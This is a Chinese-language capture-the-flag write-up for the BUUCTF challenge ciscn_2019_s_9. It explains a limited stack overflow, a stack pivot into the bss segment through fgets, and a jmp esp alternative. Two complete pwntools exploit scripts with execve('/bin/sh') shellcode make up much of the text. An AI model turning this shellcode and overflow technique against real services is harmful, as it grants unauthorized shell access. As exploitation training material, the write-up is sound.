# week4
## BUUCTF-ciscn_2019_s_9
有限的栈溢出

<img width="343" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/8abd6390-b5ca-4c08-94e4-1caea32111cc">

程序有读写执行段（栈也是）

<img width="678" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/15ae9e31-3339-49d4-864d-4f112964fb69">

考虑使用栈迁移将栈迁到bss段上 然后去执行shellcode 但无法之间向bss段中写入shellocode

可以利用fgets函数 可以看到fgets函数写入的地址是由ebp传递的（值为ebp-0x20）而我们在函数pwn返回时可以控制ebp的值

那么溢出覆盖返回地址跳回到fgets@main 此时fgets的参数是我们覆盖的ebp 实现往bss段中写入shellcode

再次执行到pwn函数的返回 进行第二次leave ret时便会将栈迁移到bss中 最终通过ret执行shellcode

### exp_ciscn_2019_s_9.py
```python
from pwn import *
# p = process("./ciscn_s_9")
p = remote("node4.buuoj.cn",27926)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

fgets_main = 0x08048512
bss = 0x804b000-0x500
hint = 0x8048551

sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = b'A' * 32
payload += p32(bss) + p32(fgets_main)

ru(">\n")

sl(payload)

payload = sc.ljust(36, b'\x90') + p32(bss-0x20)
raw_input("Ther")
sl(payload)

shell()
```

但由于栈其实也是读写执行的段 所以可以不用那么麻烦 将shellcode布置在栈上 然后通过hint中的jmp esp 再配合"sub esp, 0x28; call esp"

去执行shellcode
```python
from pwn import *
p = process('./ciscn_s_9')
# p = remote('node4.buuoj.cn',27898)
context(os = 'linux',arch = 'i386',log_level = 'debug')

shellcode_s ='''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f 
mov ebx,esp
xor ecx,ecx
mov al,0xB
int 0x80
'''

shellcode_s = asm(shellcode_s)

payload =shellcode_s.ljust(0x24,b'a') + p32(0x08048554) + asm("sub esp,0x28;call esp")
raw_input("Ther")

p.sendlineafter(b">\n",payload)

p.interactive()
```

